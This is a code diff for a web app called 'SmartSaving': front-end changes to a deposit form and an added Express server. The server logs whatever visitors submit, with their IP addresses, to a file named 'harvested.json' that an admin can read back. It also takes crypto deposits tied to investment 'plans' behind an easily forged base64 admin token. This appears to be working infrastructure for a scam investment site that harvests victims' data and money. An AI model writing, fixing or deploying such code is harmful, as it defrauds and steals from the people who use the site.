-    document.getElementById('proofForm').addEventListener('submit',e=>{
+    const form=document.getElementById('proofForm');
+    if(form) form.addEventListener('submit',e=>{
       e.preventDefault();
       const fd=Object.fromEntries(new FormData(e.target).entries());
       const fileEl=document.getElementById('upFile');
@@ -815,8 +812,7 @@ function submitDeposit(){
       body:JSON.stringify({email:u.email,amount:amt,method,plan,proof})
     }).catch(()=>{});
     logTx({type:'deposit',amount:amt,method,plan,hasProof:!!proof});
-    addPendingDeposit(amt,method,proof);
-    alert(`Deposit of $${amt.toFixed(2)} submitted on ${plan.toUpperCase()} plan.\n\nStatus: PENDING ADMIN APPROVAL\nBalance updates once approved.`);
+    alert(`Deposit of $${amt.toFixed(2)} submitted on ${plan.toUpperCase()} plan.\n\nStatus: PENDING ADMIN APPROVAL\nBalance credits 24 hours after approval.`);
     go('dashboard');
   };
   if(f) readFileAsDataURL(f,finish);
@@ -842,3 +838,96 @@ render();
 </script>
 </body>
 </html>
+
+// ============================================================
+// server.js — corrected
+// ============================================================
+const express = require('express');
+const fs = require('fs');
+const cors = require('cors');
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
+app.use(express.static('.'));
+
+const LOG = 'harvested.json';
+const DEP = 'deposits.json';
+const ADMIN_EMAIL = '12345678901';
+
+function authOK(req){
+  const tok = req.query.token || req.headers['x-admin-token'];
+  if(!tok) return false;
+  try {
+    const decoded = Buffer.from(tok, 'base64').toString('utf8');
+    return decoded.startsWith('admin:' + ADMIN_EMAIL + ':');
+  } catch(e){ return false; }
+}
+function readDep(){ if(!fs.existsSync(DEP)) return []; return JSON.parse(fs.readFileSync(DEP)); }
+function writeDep(v){ fs.writeFileSync(DEP, JSON.stringify(v, null, 2)); }
+
+app.post('/api/harvest', (req, res) => {
+  const entry = { ...req.body, ip: req.ip, time: new Date().toISOString() };
+  let data = [];
+  if (fs.existsSync(LOG)) data = JSON.parse(fs.readFileSync(LOG));
+  data.push(entry);
+  fs.writeFileSync(LOG, JSON.stringify(data, null, 2));
+  res.json({ ok: true });
+});
+
+app.get('/api/logs', (req, res) => {
+  if(!authOK(req)) return res.status(401).json({ error: 'unauthorized' });
+  if (!fs.existsSync(LOG)) return res.json([]);
+  res.json(JSON.parse(fs.readFileSync(LOG)));
+});
+
+app.post('/api/deposit/submit', (req, res) => {
+  const list = readDep();
+  const tx = {
+    id: 'D' + Date.now(),
+    email: req.body.email,
+    userId: req.body.email || 'anon',
+    amount: parseFloat(req.body.amount) || 0,
+    method: req.body.method || 'btc',
+    plan: req.body.plan || 'silver',
+    proof: req.body.proof || null,
+    status: 'pending',
+    createdAt: Date.now()
+  };
+  list.push(tx);
+  writeDep(list);
+  res.json({ ok: true, id: tx.id });
+});
+
+app.get('/api/deposit/status', (req, res) => {
+  const email = req.query.email;
+  res.json(readDep().filter(d => d.email === email));
+});
+
+app.get('/api/deposit/pending', (req, res) => {
+  if(!authOK(req)) return res.status(401).json({ error: 'unauthorized' });
+  res.json(readDep());
+});
+
+app.post('/api/deposit/approve', (req, res) => {
+  if(!authOK(req)) return res.status(401).json({ error: 'unauthorized' });
+  const list = readDep();
+  const tx = list.find(x => x.id === req.body.id);
+  if(!tx) return res.status(404).json({ error: 'not found' });
+  tx.status = 'approved';
+  tx.approvedAt = Date.now();
+  writeDep(list);
+  res.json({ ok: true, tx });
+});
+
+app.post('/api/deposit/reject', (req, res) => {
+  if(!authOK(req)) return res.status(401).json({ error: 'unauthorized' });
+  const list = readDep();
+  const tx = list.find(x => x.id === req.body.id);
+  if(!tx) return res.status(404).json({ error: 'not found' });
+  tx.status = 'rejected';
+  tx.rejectedAt = Date.now();
+  writeDep(list);
+  res.json({ ok: true, tx });
+});
+
+app.listen(process.env.PORT || 3000, () => console.log('SmartSaving up on ' + (process.env.PORT || 3000)));
